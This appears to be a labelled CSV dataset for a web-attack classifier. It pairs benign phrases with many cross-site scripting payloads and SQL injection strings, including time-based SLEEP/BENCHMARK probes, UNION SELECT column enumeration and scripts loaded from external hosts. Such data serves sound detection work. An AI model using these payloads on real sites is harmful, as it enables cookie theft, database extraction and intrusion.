input,label,length,entropy,num_quotes,has_script,has_sql_keywords,special_char_ratio
"><script>alert('XSS')</script>
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS STYLE=xss:e/**/xpression(alert('XSS'))>
</XSS STYLE=xss:expression(alert('XSS'))>
';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//;;alert(String.fromCharCode(88,83,83))//\"";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;"";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",1,460,5.1573498549058865,15,1,0,0.3347826079678639
upload profile picture,0,22,3.6069367321753214,0,0,0,0.0
&&SLEEP(5),2,10,2.9219280948873623,0,0,0,0.39999996000000404
"<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",1,61,4.6545328878585535,2,0,0,0.2622950776672938
ORDER BY 21#,2,12,3.2516291673878226,0,0,0,0.08333332638888948
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",1,56,4.9032622348595565,2,0,0,0.2678571380739797
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'""-->",1,121,4.961432659028459,8,0,0,0.3553718978894885
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13",2,64,4.251353078152579,6,0,1,0.3437499946289064
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",1,64,5.21305425036562,4,0,0,0.26562499584960947
"<div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X",1,88,4.84564447695156,2,0,0,0.2840909058626033
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",2,80,4.1970485728214415,6,0,1,0.34999999562500006
"<a href=""\xE3\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.8393429700541795,4,0,0,0.22784809838166964
<script\x0C>javascript:alert(1)</script>,1,40,4.227567157116929,0,0,0,0.22499999437500015
<BODY ONLOAD=alert('XSS')>,1,26,4.286790198827113,2,0,0,0.26923075887574005
hello world,0,11,2.8453509366224368,0,0,0,0.0
admin') or ('1'='1,2,18,3.5032583347756456,4,0,0,0.3888888672839518
"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>",1,90,4.551817609052406,2,0,0,0.344444440617284
"1) or benchmark(10000000,MD5(1))#",2,33,3.9789014084878427,0,0,0,0.21212120569329682
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",1,106,5.5614229027542885,4,0,0,0.1415094326272695
admin' or 1=1,2,13,3.3927474104487847,1,0,1,0.15384614201183525
contact support team,0,20,3.4219280948873627,0,0,0,0.0
&#X3c;,1,6,2.584962500721156,0,0,0,0.49999991666668053
"<script>alert(""XSS"");</script>&search=1",1,39,4.304257026388136,2,1,0,0.3076922998027616
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",1,85,4.952350095761651,4,0,0,0.31764705508650526
<iframe src=%(scriptlet)s <,1,27,3.9582291686698783,0,0,0,0.22222221399176983
contact support team,0,20,3.4219280948873627,0,0,0,0.0
"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"<;BODY BACKGROUND="";javascript:alert(';XSS';);"";>;",1,50,4.835728750643391,4,0,0,0.33999999320000013
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",2,116,4.493935957396036,2,0,1,0.30172413532996434
"&lt;EMBED SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",1,108,4.926721442939171,4,0,0,0.3148148118998629
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--",2,133,4.421566782904286,0,0,1,0.2781954866301091
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",2,70,4.211587790111338,6,0,1,0.34285713795918377
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"";>;",1,112,5.506919739095599,4,0,0,0.18749999832589287
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,1,96,4.273807893896308,0,0,0,0.29166666362847227
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",1,97,4.8339311417113775,4,1,0,0.26804123435009036
"<div/onmouseover='alert(1)'> style=""x:"">",1,40,4.553055907333276,4,0,0,0.3249999918750002
"</ foo=""><script>alert(1)</script>"">",1,36,4.162573265150912,2,1,0,0.3888888780864201
reset your password,0,19,3.431623565847431,0,0,0,0.0
UNION ALL SELECT 1,2,18,3.4193819456463714,0,0,1,0.0
admin') or ('1'='1'/*,2,21,3.649001209710341,5,0,0,0.47619045351474026
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",1,55,4.37437647742913,2,1,0,0.3090909034710745
"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"">",1,116,4.428748194037651,2,0,0,0.2586206874256837
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",2,65,3.751783581660109,0,0,1,0.292307687810651
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",2,63,4.44322908359366,2,0,0,0.30158729680020163
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",2,96,3.6515108547966504,0,0,1,0.31249999674479173
<script ~~~>alert(0%0)</script ~~~>,1,35,3.95729587384057,0,0,0,0.39999998857142893
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,1,40,4.234183719779189,0,1,0,0.39999999000000025
ORDER BY 15,2,11,3.095795255000934,0,0,0,0.0
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;,1,94,4.897243639530607,0,0,0,0.25531914622000906
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,1,94,4.631970267514144,2,0,0,0.24468084846084204
"<body src=1 href=1 onerror=""javascript:alert(1)""></body>",1,56,4.567606315535808,2,0,0,0.23214285299744905
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",1,49,4.750127640511121,4,0,0,0.32653060558100805
"`'><script>\x7Ejavascript:alert(1)</script>
`'><script>\xE2\x80\x87javascript:alert(1)</script>",1,95,4.537659292268194,2,1,0,0.2736842076454294
&<script>document.vulnerable=true;</script>,1,43,4.3213862662293785,0,1,0,0.20930232071389954
") or (x"")=(""x",2,13,2.931208948910323,2,0,0,0.5384614970414233
"a=""get"";b=""URL"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",1,64,4.393843945008262,10,0,0,0.43749999316406263
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",1,81,5.20233191044737,6,0,0,0.2716049349184576
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
foo<script>alert(1)</script>,1,28,3.9677201004744993,0,1,0,0.24999999107142887
"&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;",1,58,4.991348882946703,4,0,0,0.3275862012485138
"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",1,73,5.018238429628915,0,0,0,0.1506849294426722
admin' or 1=1/*,2,15,3.640223928941852,1,0,1,0.2666666488888901
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",1,66,4.45358020330253,4,0,0,0.28787878351698815
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",2,88,4.110087022937917,6,0,1,0.340909087035124
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,1,212,3.1969163477800002,0,0,0,0.41509433766464937
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",2,125,4.468039216572441,2,0,1,0.303999997568
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",1,59,4.700463287296512,4,0,0,0.2711864360815858
&#X03C,1,6,2.584962500721156,0,0,0,0.33333327777778704
"<IMG SRC=x onwheel=""alert(String.fromCharCode(88,83,83))"">",1,58,4.8319503916046935,2,0,0,0.22413792717003575
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",2,98,3.636272404831135,0,0,1,0.30612244585589343
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,1,79,4.440777306534905,0,0,0,0.1772151876301875
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#",2,47,4.173868575303572,6,0,1,0.3404255246717974
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,54,4.579258919656727,2,0,0,0.29629629080932796
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",2,38,3.8457113946239994,6,0,1,0.289473676592798
WHERE 1=1 AND 1=1--,2,19,3.2608281712244556,0,0,0,0.21052630470914185
"<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",1,84,4.715733047340915,2,0,0,0.1428571411564626
change your password,0,20,3.8219280948873626,0,0,0,0.0
"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",1,60,4.889898095464288,2,0,0,0.19999999666666674
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",1,302,3.7641566648927807,2,0,0,0.4039735085961142
ORDER BY 20--,2,13,3.238901256602631,0,0,0,0.15384614201183525
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",2,114,4.058331863354307,6,0,1,0.35087718990458605
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,1,71,4.212764197880309,0,0,0,0.15492957528268203
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>,1,109,4.792151963899499,2,0,0,0.3211009144853127
1) or sleep(5)#,2,15,3.506890595608519,0,0,0,0.2666666488888901
"<img \x47src=x onerror=""javascript:alert(1)"">",1,45,4.597082818407666,2,0,0,0.22222221728395075
<img src ?itworksonchrome?\/onerror = alert(1),1,46,4.262344294513459,0,0,0,0.17391303969754263
welcome to the site,0,19,3.221097250057957,0,0,0,0.0
UNION ALL SELECT NULL#,2,22,3.3176400059662177,0,0,1,0.045454543388429844
Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser,1,63,4.4723592893653965,0,0,0,0.15873015621063244
"UNION ALL SELECT 1,2,3,4--",2,26,3.921029621737615,0,0,1,0.1923076849112429
"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",1,78,4.346523380179961,2,0,0,0.1538461518737673
welcome to the site,0,19,3.221097250057957,0,0,0,0.0
"<IMG SRC=x onstalled=""alert(String.fromCharCode(88,83,83))"">",1,60,4.831401845392172,2,0,0,0.21666666305555562
"<IMG SRC=x onseeked=""alert(String.fromCharCode(88,83,83))"">",1,59,4.846720753111609,2,0,0,0.22033897931628849
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,1,55,4.606283522923011,0,0,0,0.2909090856198348
"<xml id=""xss"" src=""%(htc)s""></xml> <label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>",1,103,4.352355901336103,10,0,0,0.28155339532472434
"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",1,58,4.681449426894339,2,0,0,0.22413792717003575
"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",1,56,4.847097109364437,2,0,0,0.19642856792091845
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",2,45,3.99911613446803,0,0,1,0.28888888246913597
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",1,86,4.750044081232085,2,0,0,0.16279069578150354
<script itworksinallbrowsers>/*<script* */alert(1)</script,1,58,4.187121246496803,0,0,0,0.20689654815695607
"<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.864659425750382,4,0,0,0.22784809838166964
&#x0003C;,1,9,2.6416041678685938,0,0,0,0.33333329629630043
"<STYLE>li {list-style-image: url(\""javascript:alert('XSS')\"");}</STYLE><UL><LI>XSS",1,82,4.9748193462613255,4,0,0,0.3170731668649614
ORDER BY 14--,2,13,3.238901256602631,0,0,0,0.15384614201183525
"`""><\x00script>javascript:alert(1)</script>",1,43,4.297675800911846,1,0,0,0.27906976095186603
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",2,71,3.7264505950270994,0,0,1,0.2957746437214839
"\"";alert('XSS');//",1,18,3.7254805569978675,3,0,0,0.5555555246913597
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",2,52,4.390074997229215,2,0,0,0.2692307640532545
UNION ALL SELECT NULL,2,21,3.1961547809328676,0,0,1,0.0
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",2,91,4.279965123142038,2,0,0,0.31868131517932624
"`'><script>\x0Bjavascript:alert(1)</script>
`'><script>\x20javascript:alert(1)</script>",1,87,4.4077865989985945,2,1,0,0.2758620657946889
">""><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>",1,51,4.591652489446716,1,0,0,0.2745097985390236
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",1,49,4.750127640511121,4,0,0,0.32653060558100805
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',2,83,4.580018939637297,3,0,1,0.1325301188851793
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",1,51,5.397915538049927,2,0,0,0.6274509680891968
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,1,47,4.477372032888474,0,0,0,0.40425531054775937
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#",2,39,3.9191403594995746,6,0,1,0.3076922998027616
"<DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">",1,67,4.957422400345923,2,0,0,0.19402984785030078
&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,1,72,4.604506466992801,0,0,0,0.2916666626157408
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#",2,98,4.5883100336667315,2,0,1,0.2959183643273636
"`""'><img src=xxx:x \x27onerror=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
"<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",1,75,4.44197511091795,2,0,0,0.1599999978666667
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",1,96,4.462778287293878,2,0,0,0.12499999869791668
"<IMG SRC=x onpause=""alert(String.fromCharCode(88,83,83))"">",1,58,4.909368063943885,2,0,0,0.22413792717003575
<body/onload=&lt;!--&gt;&#10alert(1)>,1,37,4.4251412032329,0,0,0,0.4054053944485029
<iframe src=%(scriptlet)s <,1,27,3.9582291686698783,0,0,0,0.22222221399176983
"<script a="">"" '' SRC=""http://www.securitycompass.com/xss.js""></script>",1,70,4.532874360347046,6,0,0,0.29999999571428576
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",1,103,4.588653924905398,2,1,0,0.2718446575549062
"<P STYLE=""behavior:url('#default#time2')"" end=""0"" onEnd=""javascript:alert(1)"">",1,78,4.987217847500949,8,0,0,0.2692307657790928
"admin"" or ""1""=""1""--",2,19,3.32110433057849,5,0,0,0.4210526094182837
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;,1,315,3.397307084546928,0,0,0,0.23492063417485512
"<;IMG SRC=`javascript:alert("";RSnake says, ';XSS';"";)`>;",1,56,4.760405092002413,4,0,0,0.33928570822704096
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#",2,67,4.374560610049887,0,0,1,0.22388059367342397
<IMG SRC=`javascript:javascript:alert(1)`>,1,42,4.508521816141528,0,0,0,0.2142857091836736
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
)) or benchmark(10000000,MD5(1))#",2,135,4.075385084150359,1,0,0,0.22962962792866942
"<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",1,58,4.621936435270486,2,0,0,0.3275862012485138
"<video onerror=""javascript:javascript:alert(1)""><source>",1,56,4.324577021349437,2,0,0,0.19642856792091845
"<a href=""\x0Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
ORDER BY 31337#,2,15,3.323231428797621,0,0,0,0.06666666222222252
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",2,85,4.580662296182124,2,0,1,0.2823529378546713
upload profile picture,0,22,3.6069367321753214,0,0,0,0.0
<input value=<><iframe/src=javascript:confirm(1),1,48,4.470175521464345,0,0,0,0.20833332899305565
"<DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">",1,67,4.957422400345923,2,0,0,0.19402984785030078
%22;alert%28%27RVRSH3LL_XSS%29//,1,32,4.0511085007312415,0,0,0,0.24999999218750027
"<link REL=""stylesheet"" HREF=""javascript:document.vulnerable=true;"">",1,67,4.75578396744552,4,0,0,0.17910447493873918
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",2,92,4.131690179899632,6,0,1,0.34782608317580344
or pg_SLEEP(5),2,14,3.6644977792004614,0,0,0,0.21428569897959293
OR 1=0--,2,8,2.75,0,0,0,0.3749999531250059
";alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";",1,81,4.45398719421594,2,0,0,0.2839506137783875
"`'><script>\x00javascript:alert(1)</script>
`'><script>\xE2\x80\xA8javascript:alert(1)</script>",1,95,4.529713108034894,2,1,0,0.2736842076454294
<style>@import'http://www.securitycompass.com/xss.css';</style>,1,63,4.305481311873693,2,0,0,0.2539682499370119
read the documentation,0,22,3.572623663895164,0,0,0,0.0
&#x003C,1,7,2.521640636343318,0,0,0,0.285714244897965
"<IMG DYNSRC=""javascript:javascript:alert(1)"">",1,45,4.666977196801592,2,0,0,0.19999999555555567
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",1,75,5.123567317301466,2,0,0,0.33333332888888895
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",1,72,4.648152342896522,0,1,0,0.20833333043981486
"<div id=d><div style=""font-family:'sans\27\3B color\3Ared\3B'"">X</div></div> <script>with(document.getElementById(""d""))innerHTML=innerHTML</script>",1,147,5.118438880521518,6,1,0,0.23809523647554262
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",2,47,4.309284064167407,2,0,0,0.23404254821186068
file uploaded successfully,0,26,3.5364142371222305,0,0,0,0.0
ORDER BY 20,2,11,3.095795255000934,0,0,0,0.0
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1,66,4.593023665694501,0,0,0,0.25757575367309465
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,1,55,4.606283522923011,0,0,0,0.2909090856198348
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",1,61,4.701332116912215,2,0,0,0.3278688470841173
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
newsletter subscribed,0,21,3.499227541723357,0,0,0,0.0
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",2,107,4.537840545512811,2,0,1,0.29906541776574375
";a=prompt,a()//
';a=prompt,a()//
'-eval(window['pro'%2B'mpt'](8)"")-'",1,68,4.542822217137731,8,0,0,0.45588234623702434
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,1,55,4.853731531549135,0,0,0,0.25454544991735545
"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=",1,69,4.900059558441153,1,1,0,0.24637680802352452
"<IMG SRC=x onplay=""alert(String.fromCharCode(88,83,83))"">",1,57,4.880878391243858,2,0,0,0.2280701714373654
"<a href=""\x03javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",1,55,4.840006304237072,2,0,0,0.18181817851239676
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#",2,65,4.300623151517147,6,0,1,0.35384614840236694
"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",1,56,4.847097109364437,2,0,0,0.19642856792091845
 or ''*',2,8,2.1556390622295662,3,0,0,0.4999999375000079
&#x003C;,1,8,2.75,0,0,0,0.3749999531250059
"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"<img SRC=""javascript:document.vulnerable=true;"">",1,48,4.688721875540867,2,0,0,0.1874999960937501
"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
<ScRiPt>alert(1)</sCriPt>,1,25,4.053660689688186,0,1,0,0.27999998880000043
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",1,90,4.390845597574468,2,0,0,0.13333333185185187
"""></title><script>alert(1111)</script>",1,38,3.830182698156027,1,1,0,0.31578946537396146
<STYLE>@import'%(css)s';</STYLE>,1,32,4.351409765557392,2,0,0,0.3749999882812504
payment successful,0,18,3.5724312513221195,0,0,0,0.0
<iframe// src=javaSCRIPT&colon;alert(1),1,39,4.7019435649606205,0,0,0,0.20512819986850772
"<IMG LOWSRC=""javascript:alert('XSS')"">",1,38,4.78714396069814,4,0,0,0.26315788781163457
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",2,95,4.11914371264268,6,0,1,0.34736841739612195
pg_SLEEP(5),2,11,3.2776134368191157,0,0,0,0.2727272479338866
"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",1,81,4.531915089165912,2,0,0,0.14814814631915868
"UNION ALL SELECT 1,2,3,4,5--",2,28,3.9677201004744993,0,0,1,0.21428570663265334
